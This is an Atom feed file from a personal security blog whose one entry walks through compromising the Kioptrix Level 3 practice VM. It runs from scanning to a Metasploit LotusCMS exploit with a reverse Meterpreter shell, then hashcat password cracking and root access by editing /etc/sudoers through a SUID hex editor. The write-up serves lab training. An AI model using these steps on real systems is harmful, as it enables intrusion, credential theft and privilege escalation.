@@ -1,0 +1,144 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: suid | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/suid/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2017-01-25T13:58:13-06:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[vulhub-Kioptrix Level 3]]></title>
+    <link href="http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3/"/>
+    <updated>2016-06-09T11:42:38-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Nikto</li>
+<li>Metasploit</li>
+<li>Wfuzz</li>
+<li>Hashcat</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.184 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Ports 22 and 80 are opening.</p>
+
+<p>Now use Nikto to scan:</p>
+
+<p><code>nikto -h 192.168.79.184</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Nothing excited.</p>
+
+<p>Now lets browser the web page in the target.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Find the target may use LotusCMS.</p>
+
+<p>In msfconsole:</p>
+
+<p><code>search LotusCMS</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find one exploit</p>
+
+<pre><code>msf &gt; use exploit/multi/http/lcms_php_exec 
+msf exploit(lcms_php_exec) &gt; set rhost 192.168.79.184
+msf exploit(lcms_php_exec) &gt; set uri 
+msf exploit(lcms_php_exec) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(lcms_php_exec) &gt; set lhost 192.168.79.173
+exploit
+</code></pre>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Got the shell, next step is try to get root.</p>
+
+<p>In this step, I tried to enumeration all kinds of shit and use serveral vernerable kernel exploits to get the root but failed. During the emumeration. I found a ffile gconfig.php is interesting. Then I found that:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>maybe the  username/password for ssh, but no. Thats too easy.</p>
+
+<p>So that I go back to use wfuzz the scan the http services.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like it has phpmyadmin. Try that:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Log in using the username/password that just found. Successed.</p>
+
+<p>review the content, found this:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now found two users and the hashed passwords:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Copy the passwords to a file use hashcat to crack it:</p>
+
+<p><code>hashcat hash.txt /user/share/wordlists/rockyou.txt</code></p>
+
+<p>get both passwords:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>ssh to the target, search the SUID binaries:</p>
+
+<p><code>find / -perm +6000 -type f -exec ls -ld {} \;</code></p>
+
+<p>found an interesting file /uss/local/bin/ht, I googled it and found it is a hex editor.</p>
+
+<p>now try to use it to open /etc/sudoers file, get error message. to fix it:</p>
+
+<p><code>export TERM=xterm</code></p>
+
+<p>change the loneferret permission:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the root</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+]]></content>
+  </entry>
+  
+</feed>
